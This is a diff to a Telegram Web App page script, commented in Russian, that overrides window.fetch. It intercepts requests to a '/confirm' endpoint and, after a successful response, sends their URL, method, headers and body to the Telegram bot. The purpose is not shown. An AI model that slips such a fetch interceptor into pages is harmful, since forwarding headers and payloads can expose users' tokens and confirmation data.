@@ -5,33 +5,57 @@
 </script>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
-    Telegram.WebApp.ready();
-    const originalFetch = window.fetch;
+    Telegram.WebApp.ready();
+    const originalFetch = window.fetch;
 
-    window.fetch = async (...args) => {
-        const url = args[0];
-        console.log('Intercepted fetch request to:', url);
+    window.fetch = async (...args) => {
+        const url = args[0];
+        console.log('Intercepted fetch request to:', url);
 
-        if (url.includes('/confirm')) {
-            console.log('Request to /confirm detected:', args);
+        if (url.includes('/confirm')) {
+            console.log('Request to /confirm detected:', args);
 
-            const requestPayload = args[1]?.body;
-            if (requestPayload) {
-                try {
-                    const text = await requestPayload.text();
-                    console.log('Payload for /confirm:', text);
-                } catch (error) {
-                    console.error('Error reading request payload:', error);
-                }
-            }
-            try {
-                console.log('Sending intercepted request to Telegram:', interceptedRequest);
-                Telegram.WebApp.sendData(JSON.stringify(interceptedRequest));
-            } catch (error) {
-                console.error('Error sending data to Telegram:', error);
-            }
-        }
+            // Извлекаем тело запроса
+            const requestPayload = args[1]?.body;
+            let payloadData = null;
+            if (requestPayload) {
+                try {
+                    // Если тело запроса — строка, используем его напрямую
+                    payloadData = typeof requestPayload === 'string' ? requestPayload : JSON.stringify(requestPayload);
+                    console.log('Payload for /confirm:', payloadData);
+                } catch (error) {
+                    console.error('Error reading request payload:', error);
+                }
+            }
 
-        return originalFetch(...args);
-    };
+            // Выполняем оригинальный запрос и анализируем ответ
+            const response = await originalFetch(...args);
+
+            if (response.ok) { // Проверка на статус-код 200
+                console.log('Request to /confirm succeeded:', response);
+
+                // Формируем объект перехваченного запроса
+                const interceptedRequest = {
+                    url,
+                    method: args[1]?.method || 'GET',
+                    headers: args[1]?.headers,
+                    payload: payloadData,
+                };
+
+                try {
+                    console.log('Sending intercepted request to Telegram:', interceptedRequest);
+                    Telegram.WebApp.sendData(JSON.stringify(interceptedRequest));
+                } catch (error) {
+                    console.error('Error sending data to Telegram:', error);
+                }
+            } else {
+                console.warn('Request to /confirm failed. Status:', response.status);
+            }
+
+            return response; // Возвращаем ответ для дальнейшего использования
+        }
+
+        // Для других запросов выполняем оригинальный fetch
+        return originalFetch(...args);
+    };
 </script>
